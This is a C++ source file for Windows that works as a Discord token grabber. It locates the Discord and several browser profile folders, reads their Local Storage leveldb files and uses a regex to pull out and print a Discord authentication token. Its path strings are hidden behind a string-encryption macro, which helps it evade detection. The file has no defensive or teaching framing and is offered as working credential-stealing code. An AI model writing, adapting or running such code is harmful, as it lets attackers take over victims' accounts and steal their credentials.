#include <cstdio>
#include <string>
#include <vector>
#include <regex>
#include <windows.h>
#include <shlobj.h>

#include "Skcrypt.h"

int main() {
    std::vector<std::wstring> vec, vec_;
    WCHAR app_path[MAX_PATH], local_path[MAX_PATH];
    if (SHGetSpecialFolderPathW(NULL, app_path, CSIDL_APPDATA, 0)) {
        std::wstring ROAMING = app_path;
        const WCHAR *yoyaku_0 = es(L"\\Discord");
        const WCHAR *yoyaku_1 = es(L"\\discordcanary");
        const WCHAR *yoyaku_2 = es(L"\\discordptb");
        const WCHAR *yoyaku_3 = es(L"\\Opera Software\\Opera Stable");
        const WCHAR *yoyaku_4 = es(L"\\Opera Software\\Opera GX Stable");
        vec.push_back(ROAMING + yoyaku_0);
        vec.push_back(ROAMING + yoyaku_1);
        vec.push_back(ROAMING + yoyaku_2);
        vec.push_back(ROAMING + yoyaku_3);
        vec.push_back(ROAMING + yoyaku_4);
    }
    if (SHGetSpecialFolderPathW(NULL, local_path, CSIDL_LOCAL_APPDATA, 0)) {
        std::wstring LOCAL = local_path;
        const WCHAR *yoyaku_0 = es(L"\\Google\\Chrome\\User Data\\Default");
        const WCHAR *yoyaku_1 = es(L"\\BraveSoftware\\Brave-Browser\\User Data\\Default");
        const WCHAR *yoyaku_2 = es(L"\\Yandex\\YandexBrowser\\User Data\\Default");
        vec.push_back(LOCAL + yoyaku_0);
        vec.push_back(LOCAL + yoyaku_1);
        vec.push_back(LOCAL + yoyaku_2);
    }

    WIN32_FIND_DATAW fd;

    const WCHAR *yoyaku_0 = es(L"\\Local Storage\\leveldb\\*");
    const WCHAR *yoyaku_1 = es(L"\\Local Storage\\leveldb\\");

    const WCHAR *extension_0 = es(L".log");
    const WCHAR *extension_1 = es(L".ldb");

    for (size_t i = 0; i < vec.size(); i++) {
        std::wstring temp = vec[i] + yoyaku_0;
        HANDLE hFind = FindFirstFileW(temp.c_str(), &fd);
        if (hFind == INVALID_HANDLE_VALUE) continue;
        do {
            wchar_t *p = wcsstr(fd.cFileName, extension_0);
            if (p != NULL) vec_.push_back(vec[i] + yoyaku_1 + fd.cFileName);
            p = wcsstr(fd.cFileName, extension_1);
            if (p != NULL) vec_.push_back(vec[i] + yoyaku_1 + fd.cFileName);
        } while (FindNextFileW(hFind, &fd));
        FindClose(hFind);
    }

    //for (size_t i = 0; i < vec_.size(); i++) printf("%ls\n", vec_[i].c_str());

    for (size_t i = 0; i < vec_.size(); i++) {
        HANDLE hFile = CreateFileW(vec_[i].c_str(), GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hFile == INVALID_HANDLE_VALUE) continue;

        LARGE_INTEGER li;
        GetFileSizeEx(hFile, &li);
        unsigned char *strFile = new unsigned char[li.QuadPart];

        DWORD wReadSize;
        ReadFile(hFile, strFile, li.QuadPart, &wReadSize, NULL);

        std::regex patern{"[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}"};
        std::smatch match{};

        std::string s = (const char *)strFile;
        delete[] strFile;

        CloseHandle(hFile);

        if (std::regex_search(s, match, patern)) {
            printf("%s\n", match.str().c_str());
            break;
        }
    }

    return 0;
}
